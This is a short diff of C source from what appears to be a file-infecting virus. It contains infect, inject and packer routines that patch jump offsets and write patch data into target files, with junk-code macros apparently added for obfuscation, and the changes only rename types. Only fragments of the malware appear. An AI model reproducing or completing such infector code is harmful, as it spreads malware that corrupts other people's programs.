@@ -43,7 +43,7 @@ void __attribute__((naked)) _start(void)
 
 __attribute__((section(".text#"))) int g_start_offset = 0x1000;
 
-static int	patch_new_file(t_data *data, const char *filename) {
+static int	patch_new_file(data_t *data, const char *filename) {
 
 	JUNK;
 
@@ -69,7 +69,7 @@ static inline int64_t calc_jmp(uint64_t from, uint64_t to, uint64_t offset) {
 	return (int64_t)to - (int64_t)from - (int64_t)offset;
 }
 
-static int packer(t_data *data) {
+static int packer(data_t *data) {
 	data->packer.p_size = (size_t)&packer_end - (size_t)&packer_start;
 
 	JUNK;
@@ -81,9 +81,9 @@ static int packer(t_data *data) {
 	return 0;
 }
 
-static void init_patch(t_data *data, size_t jmp_rel_offset) {
+static void init_patch(data_t *data, size_t jmp_rel_offset) {
 
-	t_patch *patch = &data->patch;
+	patch_t *patch = &data->patch;
 
 	JUNK;
 
@@ -117,7 +117,7 @@ static void init_patch(t_data *data, size_t jmp_rel_offset) {
 	//patch->key = 0;
 }
 
-static int packer_patch(t_data *data) {
+static int packer_patch(data_t *data) {
 
 	uint16_t jmp_rel_offset = (uintptr_t)&jmp_rel - (uintptr_t)&packer_start;
 
@@ -133,13 +133,13 @@ static int packer_patch(t_data *data) {
 	JUNK;
 
 	/* patch the packer, jmp_rel offset is where the data of the packer is stored */
-	ft_memcpy(data->file + data->packer.offset + jmp_rel_offset + 1, &data->patch, sizeof(t_patch));
+	ft_memcpy(data->file + data->packer.offset + jmp_rel_offset + 1, &data->patch, sizeof(patch_t));
 
 	return 0;
 
 }
 
-static int	inject(t_data *data) {
+static int	inject(data_t *data) {
 
 	if (packer(data) != 0) {
 		return 1;
@@ -175,8 +175,8 @@ static int	inject(t_data *data) {
 static int	infect(const char *filename, bootstrap_data_t *bs_data)
 {
 
-	t_data data;
-	ft_memset(&data, 0, sizeof(t_data));
+	data_t data;
+	ft_memset(&data, 0, sizeof(data_t));
 
 	JUNK;
 
